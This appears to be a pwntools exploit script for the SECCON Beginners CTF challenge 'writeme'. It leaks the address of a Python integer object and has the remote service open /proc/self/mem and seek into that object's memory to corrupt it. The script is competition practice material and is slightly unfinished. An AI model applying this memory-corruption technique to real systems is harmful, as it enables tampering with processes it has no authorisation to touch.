#!/usr/bin/python3
from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

#FILE_NAME = ""
HOST = "writeme.quals.beginners.seccon.jp"
PORT = 27182

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#off_binsh = next(libc.search(b"/bin/sh"))

def exploit():
	conn.sendlineafter("Chance: ", "id(1)")
	id1 = int(conn.recvline())
	id42 = id1+0x20*(42-1)
	id99 = id1+0x20*(99-1)
	conn.sendlineafter("File: ", "/proc/self/mem")
	conn.sendlineafter("Seek: ", str(id42+0x18))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
